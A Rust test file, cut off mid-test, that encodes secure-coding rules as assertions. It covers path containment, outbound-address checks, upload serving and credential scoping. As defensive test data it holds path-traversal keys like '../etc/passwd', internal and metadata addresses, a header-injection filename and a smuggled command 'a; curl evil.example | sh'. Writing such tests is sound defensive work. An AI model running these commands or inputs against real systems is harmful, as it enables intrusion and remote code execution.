//! Behavior assertions for the rules derived from the authenticated PDF corpus.
//!
//! Each test states the contract of one rule in executable form, so the ledger
//! in `pdf_corpus_coverage.json` can bind a reviewed unit to a real assertion
//! rather than to prose alone.

use std::error::Error as StdError;
use std::fmt;
use std::io::{self, Read, Write};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::path::{Component, Path, PathBuf};
use std::time::{Duration, Instant};

// --- api-path-containment ---------------------------------------------------

#[derive(Debug, PartialEq)]
enum PathError {
    Malformed,
    Escapes,
}

fn resolve_in_root(root: &Path, key: &str) -> Result<PathBuf, PathError> {
    if key.is_empty() || key.contains('\0') {
        return Err(PathError::Malformed);
    }
    let mut components = Path::new(key).components();
    let (Some(Component::Normal(name)), None) = (components.next(), components.next()) else {
        return Err(PathError::Malformed);
    };
    let candidate = root.join(name);
    if !candidate.starts_with(root) {
        return Err(PathError::Escapes);
    }
    Ok(candidate)
}

#[test]
fn caller_supplied_keys_cannot_escape_the_storage_root() {
    let root = Path::new("/srv/assets");

    assert_eq!(resolve_in_root(root, "logo.png"), Ok(root.join("logo.png")));

    for hostile in [
        "../etc/passwd",
        "../../etc/passwd",
        "/etc/passwd",
        "nested/../../etc/passwd",
        "a/b",
        ".",
        "..",
        "",
        "with\0nul",
    ] {
        assert_eq!(
            resolve_in_root(root, hostile),
            Err(PathError::Malformed),
            "{hostile:?} must not resolve"
        );
    }
}

// --- api-outbound-target ----------------------------------------------------

#[derive(Debug, PartialEq)]
enum TargetError {
    Scheme,
    HostNotAllowed,
    AddressNotAllowed,
}

fn is_public(address: IpAddr) -> bool {
    match address {
        IpAddr::V4(v4) => !(v4.is_loopback()
            || v4.is_private()
            || v4.is_link_local()
            || v4.is_broadcast()
            || v4.is_documentation()
            || v4.is_multicast()
            || v4.is_unspecified()
            || v4.octets()[0] == 0
            || (v4.octets()[0] == 100 && (64..128).contains(&v4.octets()[1]))
            || v4.octets()[0] >= 240),
        IpAddr::V6(v6) => !(v6.is_loopback()
            || v6.is_unspecified()
            || v6.is_multicast()
            || (v6.segments()[0] & 0xfe00) == 0xfc00
            || (v6.segments()[0] & 0xffc0) == 0xfe80),
    }
}

fn authorize_hop(
    scheme: &str,
    host: &str,
    allowed_hosts: &[&str],
    resolved: &[IpAddr],
) -> Result<(), TargetError> {
    if scheme != "https" {
        return Err(TargetError::Scheme);
    }
    if !allowed_hosts.contains(&host) {
        return Err(TargetError::HostNotAllowed);
    }
    if resolved.is_empty() || !resolved.iter().copied().all(is_public) {
        return Err(TargetError::AddressNotAllowed);
    }
    Ok(())
}

#[test]
fn outbound_targets_are_authorized_by_scheme_host_and_resolved_address() {
    let allowed = ["api.partner.example"];
    let public = IpAddr::V4(Ipv4Addr::new(93, 184, 216, 34));

    assert_eq!(
        authorize_hop("https", "api.partner.example", &allowed, &[public]),
        Ok(())
    );

    // The cloud metadata address, loopback, private, and CGNAT ranges are denied,
    // including when they appear beside a public answer.
    for hostile in [
        IpAddr::V4(Ipv4Addr::new(169, 254, 169, 254)),
        IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)),
        IpAddr::V4(Ipv4Addr::new(10, 0, 0, 5)),
        IpAddr::V4(Ipv4Addr::new(100, 64, 0, 1)),
        IpAddr::V6(Ipv6Addr::LOCALHOST),
        IpAddr::V6(Ipv6Addr::new(0xfd00, 0, 0, 0, 0, 0, 0, 1)),
        IpAddr::V4(Ipv4Addr::new(224, 0, 0, 1)),
        IpAddr::V4(Ipv4Addr::new(240, 0, 0, 1)),
        IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)),
        IpAddr::V6(Ipv6Addr::new(0xff02, 0, 0, 0, 0, 0, 0, 1)),
    ] {
        assert_eq!(
            authorize_hop("https", "api.partner.example", &allowed, &[hostile]),
            Err(TargetError::AddressNotAllowed),
            "{hostile} must not be reachable"
        );
        assert_eq!(
            authorize_hop("https", "api.partner.example", &allowed, &[public, hostile]),
            Err(TargetError::AddressNotAllowed),
            "{hostile} must not be reachable beside a public address"
        );
    }

    assert_eq!(
        authorize_hop("http", "api.partner.example", &allowed, &[public]),
        Err(TargetError::Scheme)
    );
    assert_eq!(
        authorize_hop("https", "internal.corp", &allowed, &[public]),
        Err(TargetError::HostNotAllowed)
    );
    assert_eq!(
        authorize_hop("https", "api.partner.example", &allowed, &[]),
        Err(TargetError::AddressNotAllowed)
    );
}

// --- api-resource-limits ----------------------------------------------------

const MAX_BODY_BYTES: u64 = 1 << 10;

#[derive(Debug)]
enum IntakeError {
    TooLarge,
    Read(io::Error),
}

fn read_bounded<R: Read>(source: R) -> Result<Vec<u8>, IntakeError> {
    let mut limited = source.take(MAX_BODY_BYTES + 1);
    let mut buffer = Vec::new();
    limited
        .read_to_end(&mut buffer)
        .map_err(IntakeError::Read)?;
    if buffer.len() as u64 > MAX_BODY_BYTES {
        return Err(IntakeError::TooLarge);
    }
    Ok(buffer)
}

struct FailingReader(Option<io::Error>);

impl Read for FailingReader {
    fn read(&mut self, _: &mut [u8]) -> io::Result<usize> {
        Err(self
            .0
            .take()
            .unwrap_or_else(|| io::Error::from(io::ErrorKind::Other)))
    }
}

#[test]
fn oversized_bodies_are_rejected_without_buffering_the_whole_input() {
    let at_limit = vec![b'x'; MAX_BODY_BYTES as usize];
    assert_eq!(
        read_bounded(&at_limit[..]).expect("at the limit").len(),
        MAX_BODY_BYTES as usize
    );

    let over_limit = vec![b'x'; MAX_BODY_BYTES as usize + 1];
    assert!(matches!(
        read_bounded(&over_limit[..]),
        Err(IntakeError::TooLarge)
    ));
    // The other variant carries the underlying failure rather than hiding it.
    let failing = io::Error::from(io::ErrorKind::PermissionDenied);
    assert!(matches!(
        read_bounded(FailingReader(Some(failing))),
        Err(IntakeError::Read(error)) if error.kind() == io::ErrorKind::PermissionDenied
    ));

    // A far larger body is refused too, and the reader never consumes more than
    // one byte past the ceiling.
    let huge = vec![b'x'; MAX_BODY_BYTES as usize * 64];
    let mut source = &huge[..];
    assert!(matches!(read_bounded(&mut source), Err(IntakeError::TooLarge)));
    assert_eq!(
        huge.len() - source.len(),
        MAX_BODY_BYTES as usize + 1,
        "the limit must bound the read itself, not just the check"
    );
}

// --- api-crypto-primitives --------------------------------------------------

fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut difference = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        difference |= x ^ y;
    }
    difference == 0
}

#[test]
fn secret_comparison_examines_every_byte_regardless_of_where_it_differs() {
    let tag = [0xa1u8, 0xb2, 0xc3, 0xd4];

    assert!(constant_time_eq(&tag, &[0xa1, 0xb2, 0xc3, 0xd4]));
    assert!(!constant_time_eq(&tag, &[0x00, 0xb2, 0xc3, 0xd4]));
    assert!(!constant_time_eq(&tag, &[0xa1, 0xb2, 0xc3, 0xd5]));
    assert!(!constant_time_eq(&tag, &[0xa1, 0xb2, 0xc3]));

    // Differing in the first byte and differing in the last byte must both be
    // decided by the same, full-length loop.
    let mut first_byte_differs = tag;
    first_byte_differs[0] ^= 0xff;
    let mut last_byte_differs = tag;
    last_byte_differs[3] ^= 0xff;
    assert_eq!(
        constant_time_eq(&tag, &first_byte_differs),
        constant_time_eq(&tag, &last_byte_differs)
    );
}

// --- type-time-domain -------------------------------------------------------

#[test]
fn elapsed_time_comes_from_the_monotonic_clock() {
    let started = Instant::now();
    let mut readings = Vec::new();
    for _ in 0..64 {
        readings.push(started.elapsed());
    }

    // A steady clock never runs backwards, so successive readings are ordered.
    for pair in readings.windows(2) {
        assert!(pair[1] >= pair[0], "monotonic clock went backwards");
    }
    assert!(readings.last().copied().unwrap_or_default() < Duration::from_secs(60));

    // Wall-clock differences are fallible by construction: the type forces the
    // caller to handle a clock that moved.
    let earlier = std::time::SystemTime::now();
    let difference = std::time::UNIX_EPOCH.duration_since(earlier);
    assert!(
        difference.is_err(),
        "SystemTime subtraction must report, not assume, ordering"
    );
}

// --- type-secret-material ---------------------------------------------------

trait Wipe {
    fn wipe(&mut self);
}

impl Wipe for String {
    fn wipe(&mut self) {
        let mut bytes = std::mem::take(self).into_bytes();
        bytes.iter_mut().for_each(|byte| *byte = 0);
    }
}

struct Secret<T: Wipe>(T);

impl<T: Wipe> Secret<T> {
    fn new(inner: T) -> Self {
        Self(inner)
    }

    fn expose(&self) -> &T {
        &self.0
    }
}

impl<T: Wipe> fmt::Debug for Secret<T> {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str("Secret([redacted])")
    }
}

impl<T: Wipe> Drop for Secret<T> {
    fn drop(&mut self) {
        self.0.wipe();
    }
}

#[derive(Debug)]
struct DatabaseSettings {
    username: String,
    password: Secret<String>,
}

#[test]
fn secrets_are_redacted_in_debug_output_of_enclosing_types() {
    let settings = DatabaseSettings {
        username: "app".to_owned(),
        password: Secret::new("hunter2".to_owned()),
    };

    assert_eq!(settings.username, "app");
    let rendered = format!("{settings:?}");
    assert!(rendered.contains("Secret([redacted])"));
    assert!(!rendered.contains("hunter2"));
    assert!(rendered.contains("app"), "non-secret fields still render");
    assert_eq!(settings.password.expose(), "hunter2");
}

// --- type-variance ----------------------------------------------------------

struct MutStr<'a, 'b> {
    s: &'a mut &'b str,
}

#[test]
fn separate_lifetimes_keep_a_mutable_field_usable_after_the_borrow_ends() {
    let mut value = "hello";
    *MutStr { s: &mut value }.s = "world";

    // With a single lifetime the shared read below would not compile, because
    // the lifetime behind `&mut` is invariant and cannot be shortened.
    assert_eq!(value, "world");
}

// --- test-fuzz-target -------------------------------------------------------

fn parse_header(input: &[u8]) -> Result<(&[u8], &[u8]), ()> {
    let colon = input.iter().position(|byte| *byte == b':').ok_or(())?;
    let (name, rest) = input.split_at(colon);
    let value = rest.get(1..).ok_or(())?;
    if name.is_empty() {
        return Err(());
    }
    Ok((name, value))
}

fn parse_is_total_and_lossless(input: &[u8]) {
    if let Ok((name, value)) = parse_header(input) {
        assert_eq!(name.len() + 1 + value.len(), input.len());
    }
}

#[test]
fn the_fuzz_property_holds_over_the_seed_corpus_and_past_crashers() {
    let corpus: [&[u8]; 8] = [
        b"a:b",
        b"",
        b":",
        b"x:",
        b"no-colon",
        b"::",
        &[0xff, b':', 0x00],
        &[b':', 0xff],
    ];
    for seed in corpus {
        parse_is_total_and_lossless(seed);
    }

    assert!(parse_header(b":value").is_err(), "an empty name is rejected");
    assert_eq!(parse_header(b"k:").expect("empty value parses").1, b"");
}

// --- proj-cli-contract ------------------------------------------------------

/// A writer that reports `BrokenPipe` once the downstream consumer has stopped
/// reading, like `prog | head`.
struct ClosedPipe {
    accepted: usize,
}

impl Write for ClosedPipe {
    fn write(&mut self, buffer: &[u8]) -> io::Result<usize> {
        if self.accepted > 0 {
            self.accepted -= 1;
            return Ok(buffer.len());
        }
        Err(io::Error::new(io::ErrorKind::BrokenPipe, "closed"))
    }

    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
}

fn emit(lines: &[&str], output: &mut impl Write) -> io::Result<bool> {
    let mut all_ok = true;
    for line in lines {
        if line.is_empty() {
            eprintln!("-: empty input");
            all_ok = false;
            continue;
        }
        match output.write_all(line.as_bytes()) {
            Err(error) if error.kind() == io::ErrorKind::BrokenPipe => return Ok(all_ok),
            other => other?,
        }
    }
    Ok(all_ok)
}

#[test]
fn cli_output_stops_cleanly_on_a_closed_pipe_and_failures_reach_the_exit_status() {
    // A consumer that quits after one line ends the program successfully.
    let mut pipe = ClosedPipe { accepted: 1 };
    assert!(matches!(emit(&["one", "two", "three"], &mut pipe), Ok(true)));

    // A bad input is reported and skipped, but the run still fails overall.
    let mut sink = Vec::new();
    assert!(matches!(emit(&["one", "", "three"], &mut sink), Ok(false)));
    assert_eq!(sink, b"onethree");
}

// --- err-short-read ---------------------------------------------------------

fn read_available<R: Read>(reader: &mut R, buffer: &mut [u8]) -> io::Result<usize> {
    let mut filled = 0;
    while filled < buffer.len() {
        match reader.read(&mut buffer[filled..])? {
            0 => break,
            read => filled += read,
        }
    }
    Ok(filled)
}

/// A reader that hands back one byte at a time, like a socket delivering
/// segments — the case a single `read` call silently truncates.
struct Dribble<'a>(&'a [u8]);

impl Read for Dribble<'_> {
    fn read(&mut self, out: &mut [u8]) -> io::Result<usize> {
        if self.0.is_empty() || out.is_empty() {
            return Ok(0);
        }
        out[0] = self.0[0];
        self.0 = &self.0[1..];
        Ok(1)
    }
}

#[test]
fn a_short_read_is_reported_rather_than_padding_the_buffer() {
    let source = b"abc";

    // One `read` call against a dribbling reader returns 1, not 3: code that
    // ignored the count would treat 7 stale bytes as input.
    let mut once = [0u8; 8];
    let first = Dribble(source).read(&mut once).expect("read");
    assert_eq!(first, 1);

    let mut buffer = [0u8; 8];
    let filled = read_available(&mut Dribble(source), &mut buffer).expect("read");
    assert_eq!(filled, 3);
    assert_eq!(&buffer[..filled], b"abc");
    assert_eq!(&buffer[filled..], &[0u8; 5], "the tail is untouched, not data");

    // When the length is part of the format, a truncated stream must fail.
    let mut required = [0u8; 8];
    let error = Dribble(source).read_exact(&mut required).unwrap_err();
    assert_eq!(error.kind(), io::ErrorKind::UnexpectedEof);
}

// --- err-debug-assert-scope -------------------------------------------------

const HEADER_LEN: usize = 4;

#[derive(Debug, PartialEq)]
enum RecordError {
    Truncated,
}

fn parse_record(bytes: &[u8]) -> Result<(&[u8], &[u8]), RecordError> {
    if bytes.len() < HEADER_LEN {
        return Err(RecordError::Truncated);
    }
    let (header, body) = bytes.split_at(HEADER_LEN);
    debug_assert_eq!(header.len(), HEADER_LEN);
    Ok((header, body))
}

#[test]
fn boundary_validation_returns_an_error_in_every_profile() {
    assert_eq!(parse_record(b"abcdBODY"), Ok((&b"abcd"[..], &b"BODY"[..])));
    // This must hold whether or not debug assertions are compiled in, which is
    // exactly what a `debug_assert!` guard could not promise.
    assert_eq!(parse_record(b"ab"), Err(RecordError::Truncated));
    assert_eq!(parse_record(b""), Err(RecordError::Truncated));
}

// --- err-send-sync-static ---------------------------------------------------

#[derive(Debug)]
struct StoreError {
    key: String,
    source: Option<Box<dyn StdError + Send + Sync + 'static>>,
}

impl fmt::Display for StoreError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(formatter, "store rejected key {}", self.key)
    }
}

impl StdError for StoreError {
    fn source(&self) -> Option<&(dyn StdError + 'static)> {
        self.source
            .as_deref()
            .map(|source| source as &(dyn StdError + 'static))
    }
}

fn assert_error_contract<E: StdError + Send + Sync + 'static>() {}

#[test]
fn public_errors_can_cross_threads_and_be_wrapped() {
    assert_error_contract::<StoreError>();

    let error = StoreError {
        key: "orders/42".to_owned(),
        source: Some(Box::new(io::Error::from(io::ErrorKind::PermissionDenied))),
    };
    assert!(error.source().is_some(), "the cause survives boxing");

    // The bounds are what make these two standard moves possible at all.
    let boxed: Box<dyn StdError + Send + Sync + 'static> = Box::new(error);
    let wrapped = io::Error::other(boxed);
    assert!(wrapped.get_ref().is_some());

    let moved = std::thread::spawn(|| StoreError { key: "k".to_owned(), source: None })
        .join()
        .expect("thread panicked");
    assert_eq!(moved.to_string(), "store rejected key k");
}

// --- serde-byte-order / serde-format-version --------------------------------

const MAGIC: [u8; 4] = *b"IDX1";
const VERSION: u16 = 2;

#[derive(Debug, PartialEq)]
enum FormatError {
    NotOurFormat,
    UnsupportedVersion(u16),
    Truncated,
}

fn read_header(source: &mut impl Read) -> Result<u16, FormatError> {
    let mut magic = [0u8; 4];
    let mut version = [0u8; 2];
    source.read_exact(&mut magic).map_err(|_| FormatError::Truncated)?;
    source.read_exact(&mut version).map_err(|_| FormatError::Truncated)?;
    if magic != MAGIC {
        return Err(FormatError::NotOurFormat);
    }
    match u16::from_be_bytes(version) {
        supported @ 1..=VERSION => Ok(supported),
        other => Err(FormatError::UnsupportedVersion(other)),
    }
}

#[test]
fn wire_encoding_is_fixed_by_the_format_not_by_the_host() {
    // Declared big-endian: the bytes are the same on every architecture, which
    // is the property a same-host round-trip cannot demonstrate.
    assert_eq!(0x0102_0304_u32.to_be_bytes(), [0x01, 0x02, 0x03, 0x04]);
    assert_eq!(u32::from_be_bytes([0x01, 0x02, 0x03, 0x04]), 0x0102_0304);
}

#[test]
fn a_versioned_header_rejects_foreign_and_future_files() {
    let mut file = MAGIC.to_vec();
    file.extend_from_slice(&VERSION.to_be_bytes());
    assert_eq!(read_header(&mut &file[..]), Ok(VERSION));

    assert_eq!(read_header(&mut &b"JPEG\0\x01"[..]), Err(FormatError::NotOurFormat));
    assert_eq!(
        read_header(&mut &b"IDX1\0\x63"[..]),
        Err(FormatError::UnsupportedVersion(99)),
        "a newer writer's file must be refused, not decoded"
    );
    assert_eq!(read_header(&mut &b"IDX"[..]), Err(FormatError::Truncated));
}

// --- api-record-checksum ----------------------------------------------------

fn checksum(bytes: &[u8]) -> u32 {
    bytes.iter().fold(0x811c_9dc5_u32, |acc, byte| {
        (acc ^ u32::from(*byte)).wrapping_mul(0x0100_0193)
    })
}

fn encode_record(payload: &[u8]) -> Vec<u8> {
    let mut record = checksum(payload).to_be_bytes().to_vec();
    record.extend_from_slice(payload);
    record
}

fn decode_record(record: &[u8]) -> Result<&[u8], u32> {
    let (stored, payload) = record.split_at(4);
    let expected = u32::from_be_bytes(stored.try_into().unwrap_or([0; 4]));
    let actual = checksum(payload);
    if expected != actual { Err(actual) } else { Ok(payload) }
}

#[test]
fn a_single_flipped_bit_is_detected_before_the_payload_is_used() {
    let record = encode_record(b"ledger entry");
    assert_eq!(decode_record(&record), Ok(&b"ledger entry"[..]));

    for index in 4..record.len() {
        let mut corrupted = record.clone();
        corrupted[index] ^= 0b0000_0001;
        assert!(
            decode_record(&corrupted).is_err(),
            "a flipped bit at {index} must not decode"
        );
    }

    // Truncation changes the protected span, so it fails too.
    assert!(decode_record(&record[..record.len() - 1]).is_err());
}

// --- api-subprocess-args ----------------------------------------------------

#[test]
fn shell_metacharacters_stay_inside_one_argument() {
    use std::process::Command;

    let hostile = "a; curl evil.example | sh";
    let mut command = Command::new("/usr/bin/tar");
    command.arg("czf").arg("out.tgz").arg("--").arg(hostile);

    let args: Vec<String> = command
        .get_args()
        .map(|arg| arg.to_string_lossy().into_owned())
        .collect();
    assert_eq!(args, ["czf", "out.tgz", "--", hostile]);
    assert_eq!(
        args.iter().filter(|arg| arg.contains(';')).count(),
        1,
        "the metacharacters are one literal operand, not a new command"
    );
}

// --- proj-secret-file-mode --------------------------------------------------

#[cfg(unix)]
#[test]
fn credential_files_are_created_owner_only() {
    use std::fs::{self, DirBuilder, OpenOptions};
    use std::os::unix::fs::{DirBuilderExt, OpenOptionsExt, PermissionsExt};

    let dir = std::env::temp_dir().join(format!("rust-skills-secret-{}", std::process::id()));
    let _ = fs::remove_dir_all(&dir);
    DirBuilder::new().recursive(true).mode(0o700).create(&dir).expect("mkdir");

    let path = dir.join("token");
    let mut file = OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .mode(0o600)
        .open(&path)
        .expect("create");
    file.write_all(b"s3cret").expect("write");

    // The mode is set by the create call, so there is no window in which the
    // secret exists under a wider mode.
    let mode = fs::metadata(&path).expect("stat").permissions().mode() & 0o777;
    assert_eq!(mode, 0o600, "secret must be owner read/write only");
    let dir_mode = fs::metadata(&dir).expect("stat dir").permissions().mode() & 0o777;
    assert_eq!(dir_mode, 0o700, "the containing directory must be owner-only");

    fs::remove_dir_all(&dir).expect("cleanup");
}

// --- type-path-not-string ---------------------------------------------------

#[test]
fn paths_are_extended_without_a_utf8_round_trip() {
    use std::ffi::OsString;

    let path = Path::new("/var/data/report.csv");
    let mut name = path.file_name().map(OsString::from).unwrap_or_default();
    name.push(".bak");
    let target = path.with_file_name(name);

    assert_eq!(target, Path::new("/var/data/report.csv.bak"));
    assert!(target.starts_with(Path::new("/var/data")));

    // On Unix a path need not be UTF-8 at all; `to_str` reports that instead of
    // guessing, which is why the operations above stay in path space.
    #[cfg(unix)]
    {
        use std::os::unix::ffi::OsStrExt;
        let raw = std::ffi::OsStr::from_bytes(&[0xff, 0xfe]);
        let non_utf8 = Path::new(raw);
        assert!(non_utf8.to_str().is_none());
        assert_eq!(non_utf8.to_string_lossy(), "\u{fffd}\u{fffd}");
    }
}

// --- conc-signal-handler-safety ---------------------------------------------

use std::sync::atomic::{AtomicBool, Ordering};

static SHUTDOWN: AtomicBool = AtomicBool::new(false);

/// The entire handler: one atomic store, nothing that can allocate or lock.
extern "C" fn on_terminate(_signal: i32) {
    SHUTDOWN.store(true, Ordering::SeqCst);
}

fn serve_until_shutdown(mut step: impl FnMut() -> bool) -> &'static str {
    while !SHUTDOWN.load(Ordering::SeqCst) {
        if !step() {
            return "finished";
        }
    }
    "shutdown requested"
}

#[test]
fn a_signal_handler_only_flips_a_flag_that_ordinary_code_observes() {
    let mut ticks = 0;
    assert_eq!(
        serve_until_shutdown(|| {
            ticks += 1;
            ticks < 3
        }),
        "finished"
    );
    assert_eq!(ticks, 3);

    on_terminate(15);
    assert!(SHUTDOWN.load(Ordering::SeqCst));
    // The loop stops before running any further work.
    assert_eq!(serve_until_shutdown(|| panic!("must not run")), "shutdown requested");
}

// --- api-dir-enumeration ----------------------------------------------------

#[test]
fn a_directory_listing_is_sorted_and_survives_a_bad_entry() {
    use std::fs;

    let root = std::env::temp_dir().join(format!("rust-skills-walk-{}", std::process::id()));
    let _ = fs::remove_dir_all(&root);
    fs::create_dir_all(root.join("sub")).expect("mkdir");
    for name in ["c.txt", "a.txt", "b.txt"] {
        fs::write(root.join(name), b"x").expect("write");
    }

    let mut entries: Vec<PathBuf> = Vec::new();
    let mut skipped = 0usize;
    for item in fs::read_dir(&root).expect("read_dir") {
        match item {
            Ok(entry) => entries.push(entry.path()),
            Err(_) => skipped += 1,
        }
    }
    entries.sort();

    let names: Vec<String> = entries
        .iter()
        .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
        .collect();
    assert_eq!(names, ["a.txt", "b.txt", "c.txt", "sub"], "order is imposed, not assumed");
    assert_eq!(skipped, 0);

    // Opening a directory that does not exist is a whole-operation failure,
    // which is a different case from one unreadable entry.
    assert!(fs::read_dir(root.join("missing")).is_err());
    fs::remove_dir_all(&root).expect("cleanup");
}

// --- type-text-decode-policy ------------------------------------------------

#[test]
fn strict_and_lossy_decoding_are_distinguishable_choices() {
    use std::borrow::Cow;

    let valid = "ok".as_bytes();
    // Built at runtime: a literal here would be diagnosed statically, which is
    // not the situation the rule is about — these bytes arrive from a file.
    let mut invalid = b"fo".to_vec();
    invalid.insert(1, 0xff);
    let invalid = invalid.as_slice();

    // Strict: the caller learns exactly where the input went wrong.
    assert_eq!(std::str::from_utf8(valid), Ok("ok"));
    let error = std::str::from_utf8(invalid).expect_err("invalid utf-8");
    assert_eq!(error.valid_up_to(), 1);

    // Lossy: the text is repaired, and the caller can tell that it was.
    let repaired = String::from_utf8_lossy(invalid);
    assert!(matches!(repaired, Cow::Owned(_)), "substitution happened");
    assert!(repaired.contains('\u{fffd}'));
    assert!(matches!(String::from_utf8_lossy(valid), Cow::Borrowed("ok")));
}

// --- ffi-status-to-result ---------------------------------------------------

fn foreign_call(succeed: bool) -> i32 {
    if succeed { 3 } else { -1 }
}

fn checked_call(succeed: bool) -> io::Result<i32> {
    let status = foreign_call(succeed);
    if status < 0 {
        return Err(io::Error::last_os_error());
    }
    Ok(status)
}

#[test]
fn a_foreign_status_becomes_a_result_at_the_boundary() {
    assert_eq!(checked_call(true).expect("succeeds"), 3);
    let error = checked_call(false).expect_err("fails");
    // A sentinel integer does not travel further into the program.
    assert!(error.raw_os_error().is_some() || error.kind() != io::ErrorKind::Other);
}

// --- proj-append-log-recovery -----------------------------------------------

const LOG_HEADER: usize = 2;

fn log_checksum(payload: &[u8]) -> u8 {
    payload.iter().fold(0u8, |acc, byte| acc ^ byte)
}

#[derive(Debug, PartialEq)]
enum Recovery {
    Clean { records: usize },
    PartialTail { records: usize, discarded: usize },
}

#[derive(Debug, PartialEq)]
enum Corruption {
    Interior { offset: usize },
}

fn recover(log: &[u8]) -> Result<Recovery, Corruption> {
    let mut offset = 0;
    let mut records = 0;
    while offset < log.len() {
        let rest = &log[offset..];
        if rest.len() < LOG_HEADER || rest.len() < LOG_HEADER + usize::from(rest[0]) {
            return Ok(Recovery::PartialTail { records, discarded: rest.len() });
        }
        let len = usize::from(rest[0]);
        let payload = &rest[LOG_HEADER..LOG_HEADER + len];
        if log_checksum(payload) != rest[1] {
            return Err(Corruption::Interior { offset });
        }
        records += 1;
        offset += LOG_HEADER + len;
    }
    Ok(Recovery::Clean { records })
}

fn log_record(payload: &[u8]) -> Vec<u8> {
    let mut out = vec![payload.len() as u8, log_checksum(payload)];
    out.extend_from_slice(payload);
    out
}

#[test]
fn a_torn_tail_ends_recovery_cleanly_but_interior_damage_does_not() {
    let mut log = log_record(b"one");
    log.extend(log_record(b"two"));
    assert_eq!(recover(&log), Ok(Recovery::Clean { records: 2 }));

    // An interrupted append: short header, and short payload.
    for truncate_to in [1, 4] {
        let mut torn = log.clone();
        torn.extend(log_record(b"three")[..truncate_to].to_vec());
        assert_eq!(
            recover(&torn),
            Ok(Recovery::PartialTail { records: 2, discarded: truncate_to })
        );
    }

    // A flipped bit with data after it is corruption, not a torn write, and
    // must not be silently treated as the end of the log.
    let mut damaged = log.clone();
    damaged[2] ^= 0b1;
    assert_eq!(recover(&damaged), Err(Corruption::Interior { offset: 0 }));
}

// --- api-upload-serving -----------------------------------------------------

const INLINE_KINDS: [(&str, &str); 3] = [
    ("png", "image/png"),
    ("jpg", "image/jpeg"),
    ("pdf", "application/pdf"),
];

fn sanitize_filename(name: &str) -> String {
    name.chars()
        .filter(|c| !matches!(c, '"' | '\\' | '\r' | '\n'))
        .collect()
}

fn serve_headers(verified_kind: &str, display_name: &str) -> (&'static str, String) {
    match INLINE_KINDS.iter().find(|(kind, _)| *kind == verified_kind) {
        Some((_, content_type)) => (
            content_type,
            format!("inline; filename=\"{}\"", sanitize_filename(display_name)),
        ),
        None => (
            "application/octet-stream",
            format!("attachment; filename=\"{}\"", sanitize_filename(display_name)),
        ),
    }
}

#[test]
fn scriptable_uploads_are_served_inertly() {
    let (content_type, disposition) = serve_headers("png", "holiday.png");
    assert_eq!(content_type, "image/png");
    assert!(disposition.starts_with("inline"));

    // SVG and HTML are markup: never rendered from the app's own origin.
    for kind in ["svg", "html", "xml", "exe"] {
        let (content_type, disposition) = serve_headers(kind, "payload");
        assert_eq!(content_type, "application/octet-stream", "{kind} must not render");
        assert!(disposition.starts_with("attachment"));
    }

    // A filename cannot inject a header.
    let (_, disposition) = serve_headers("svg", "a\"\r\nSet-Cookie: x=1");
    assert!(!disposition.contains('\r'));
    assert!(!disposition.contains('\n'));
    assert_eq!(disposition.matches('"').count(), 2, "only the delimiters remain");
}

// --- api-credential-scope ---------------------------------------------------

#[derive(Debug, PartialEq, Eq, Clone)]
struct Origin {
    scheme: &'static str,
    host: &'static str,
    port: u16,
}

struct Credential {
    origin: Origin,
    token: &'static str,
}

impl Credential {
    fn for_target(&self, target: &Origin) -> Option<&'static str> {
        (self.origin == *target).then_some(self.token)
    }
}

#[test]
fn a_credential_is_withheld_from_every_other_origin() {
    let issued = Origin { scheme: "https", host: "api.example.com", port: 443 };
    let credential = Credential { origin: issued.clone(), token: "t-secret" };

    assert_eq!(credential.for_target(&issued), Some("t-secret"));

    for target in [
        Origin { scheme: "http", host: "api.example.com", port: 443 },
        Origin { scheme: "https", host: "api.example.com", port: 8443 },
        Origin { scheme: "https", host: "evil.example.com", port: 443 },
        Origin { scheme: "https", host: "api.example.com.evil.test", port: 443 },
    ] {
        assert_eq!(credential.for_target(&target), None, "{target:?} must not receive it");
    }
}

// --- opt-monomorph-outline --------------------------------------------------

fn load_config<P: AsRef<Path>>(path: P) -> Result<usize, String> {
    // Non-generic body: compiled once regardless of how many caller types the
    // generic shell is instantiated with.
    fn inner(path: &Path) -> Result<usize, String> {
        path.to_str()
            .map(str::len)
            .ok_or_else(|| "path is not utf-8".to_owned())
    }
    inner(path.as_ref())
}

#[test]
fn a_generic_shell_delegates_to_one_non_generic_body() {
    let from_str = load_config("app.conf").expect("loads");
    let from_path = load_config(Path::new("app.conf")).expect("loads");
    let from_owned = load_config(String::from("app.conf")).expect("loads");
    let from_pathbuf = load_config(PathBuf::from("app.conf")).expect("loads");

    assert_eq!(from_str, 8);
    assert_eq!([from_path, from_owned, from_pathbuf], [from_str; 3]);
}

// --- api-datagram-trust -----------------------------------------------------

#[derive(Debug, PartialEq)]
enum Reject {
    WrongPeer,
    UnknownId,
}

struct Pending {
    peer: std::net::SocketAddr,
    id: u16,
}

impl Pending {
    fn accept<'a>(&self, from: std::net::SocketAddr, datagram: &'a [u8]) -> Result<&'a [u8], Reject> {
        if from != self.peer {
            return Err(Reject::WrongPeer);
        }
        let (id, payload) = datagram.split_at(2);
        if u16::from_be_bytes([id[0], id[1]]) != self.id {
            return Err(Reject::UnknownId);
        }
        Ok(payload)
    }
}

#[test]
fn a_forged_datagram_fails_on_either_the_sender_or_the_identifier() {
    let server = std::net::SocketAddr::new(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 53)), 53);
    let pending = Pending { peer: server, id: 0xa17f };

    let mut reply = 0xa17f_u16.to_be_bytes().to_vec();
    reply.extend_from_slice(b"answer");
    assert_eq!(pending.accept(server, &reply), Ok(&b"answer"[..]));

    // Right identifier, wrong sender: an off-path forgery.
    let elsewhere = std::net::SocketAddr::new(IpAddr::V4(Ipv4Addr::new(198, 51, 100, 7)), 53);
    assert_eq!(pending.accept(elsewhere, &reply), Err(Reject::WrongPeer));

    // Right sender, guessed identifier: a blind forgery from the path.
    let mut forged = 0x0001_u16.to_be_bytes().to_vec();
